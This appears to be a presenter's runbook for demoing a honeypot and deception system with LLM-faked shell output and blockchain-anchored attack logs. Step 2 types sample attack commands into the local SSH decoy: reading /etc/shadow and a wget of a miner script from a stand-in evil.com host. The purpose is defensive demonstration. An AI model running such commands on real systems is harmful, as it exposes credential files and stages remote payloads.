# Live Demo Runbook

A repeatable script for presenting the system live. Follow the steps in
order; each has what to run, what to say, and what should appear on screen.
Total time: ~8-10 minutes.

## Before you start (do this 15 minutes before the room fills up)

1. Start Docker Desktop (whale icon in the menu bar should say "running").
2. Bring the stack up:
   ```
   cd CODE
   docker compose up -d
   ```
   Wait ~30s, then confirm everything is healthy:
   ```
   curl -s http://localhost:3001/health
   ```
   Expect: `{"status":"ok","redis":true,"blockchain":true}`
3. Open the dashboard in a real browser tab (not headless): `http://localhost:3000`
   Keep this tab visible/projected for the whole demo.
4. Open a second terminal window for running attack commands — keep it
   next to (or behind) the browser so you can alt-tab between "attacker
   terminal" and "SOC dashboard" like a real red-team/blue-team demo.
5. Optional but recommended: start the background simulator a few minutes
   before your slot so the dashboard already has a realistic amount of
   history by the time you present (see Step 0 below).

---

## Step 0 — Seed realistic background activity (optional, do this early)

In the second terminal:
```
cd CODE
python3 simulate_attacks.py --burst --rate 8
```
Let it run in the background (or a separate terminal tab) throughout your
presentation. It fires a random real attack (SSH brute-force + commands,
SQL injection, prompt injection, Web3 RPC abuse, Jenkins exploitation)
against a random decoy every ~8 seconds on average. This keeps the
dashboard visibly "alive" the whole time instead of sitting at zero until
you manually attack it.

Stop it with Ctrl+C whenever you want a quiet moment, e.g. right before
Step 2 if you want a clean before/after on the KPI numbers.

**Say:** "This is what the system looks like under continuous background
scanning — the kind of traffic any internet-facing system gets within
hours of going live."

---

## Step 1 — Orient the room (Overview page)

Point at the dashboard, already showing live numbers.

**Say:**
> "This is a cyber deception framework. Five fake services are exposed to
> the internet, pretending to be a real company's infrastructure — an SSH
> server, a database, an internal AI API, an Ethereum node, and a Jenkins
> CI/CD server. Anyone who attacks them is actually attacking a decoy. We
> capture everything they do, classify the attack automatically, and
> permanently record proof of it on a blockchain so the evidence can't be
> altered afterward."

Point out on screen: KPI row (attacks intercepted, unique IPs, services
under attack, % anchored on-chain), the activity chart, and the intent
breakdown.

---

## Step 2 — Live attack, narrated (the core demo)

Pause the simulator (Ctrl+C) if you want a clean moment. Then in the
attacker terminal:

```
ssh root@localhost -p 2222
```
Enter any password (e.g. `toor123`) — **say while typing:**
> "Notice it accepts any password. That's deliberate — we want attackers
> to get in and start exploring."

Once inside the fake shell, type these one at a time, pausing after each
to point at the dashboard's Live Feed panel updating in real time:

```
whoami
```
**Say:** "Normal recon — the system gives a realistic response."

```
sudo cat /etc/shadow
```
**Say:** "Now watch the dashboard — this just got classified as
**privilege escalation** automatically, the moment it happened."

```
wget http://evil.com/miner.sh -O /tmp/x.sh
```
**Say:** "This one's flagged as a **reverse shell / malware staging**
attempt. And look at the response it got — that wasn't a canned string.
That's a large language model generating a realistic fake terminal output
live, including a believable DNS failure. The attacker has no easy way to
tell this isn't a real server."

```
exit
```

Switch to the dashboard. Click on the new event row in **Live feed** to
open the detail drawer.

**Say:** "Every event has a SHA-256 hash, and shows whether it's been
anchored to the blockchain yet."

---

## Step 3 — Prove the tamper-evidence claim (the strongest moment)

In the attacker terminal:
```
cd CODE
python3 verify_integrity.py
```

**Say while it runs:**
> "This fetches the log we just created, recomputes its hash, and confirms
> it matches what's permanently written to the blockchain. Then it shows
> what happens if someone tampers with the log afterward — the hash
> changes and the tampering is immediately detectable. This is what makes
> the evidence forensically usable, not just a log file someone could
> quietly edit."

Point out the final two lines of output:
```
Untampered match: True
Tamper detected (hash mismatch vs. on-chain-anchored hash): True
```

---

## Step 4 — Tour the other three pages (fast, ~30s each)

**Live feed** — click "Live feed" in the sidebar.
**Say:** "Every interaction across all five decoys, searchable and
filterable by service or attack type." Type something in the search box,
click an intent filter chip to demonstrate.

**Attackers** — click "Attackers."
**Say:** "Every source IP gets a threat profile — session timeline, which
services it hit, and a severity score weighted toward dangerous intents
like reverse shells over harmless recon." Click the top attacker to show
the detail panel.

**Services** — click "Services."
**Say:** "Health and attack-surface breakdown per decoy — useful for
seeing which fake service is drawing the most attention."

---

## Step 5 — Close with the honest research angle

**Say:**
> "We didn't just build this and assume it works — we evaluated it against
> a static-response baseline using real, publicly documented attack
> payloads, not hand-written ones. We also found and reported a real
> weakness: our AI API decoy's response realism dropped significantly at
> scale, including one case where it leaked an AI safety disclaimer — which
> would immediately tip off a real attacker. We think reporting that
> honestly is more valuable than hiding it, and it points directly at
> future work: better prompt isolation for that specific decoy."

This is your strongest line for a viva — it shows genuine evaluation
rather than a demo dressed up as research.

---

## If something goes wrong live

- **Dashboard shows "Feed disconnected":** the backend container likely
  restarted. Run `docker compose ps` — if `backend` isn't "Up," run
  `docker compose up -d backend` and refresh the browser tab.
- **"Chain unreachable":** Ganache container issue. `docker compose restart ganache backend`.
- **SSH command hangs / no response:** the AI engine call to OpenRouter may
  be slow or the API key ran out of credit. Static commands (`whoami`,
  `ls`, `id`, `pwd`, `env`) always answer instantly regardless — fall back
  to those if live LLM calls are misbehaving.
- **Nothing to show at all:** run `python3 simulate_attacks.py --burst --rate 3`
  for 20 seconds to populate the dashboard, then Ctrl+C and proceed from Step 1.

## Shutting down afterward
```
docker compose down
```
(Add `-v` only if you want to wipe Redis/Postgres data between demos —
don't use it if you want history to persist to the next run.)
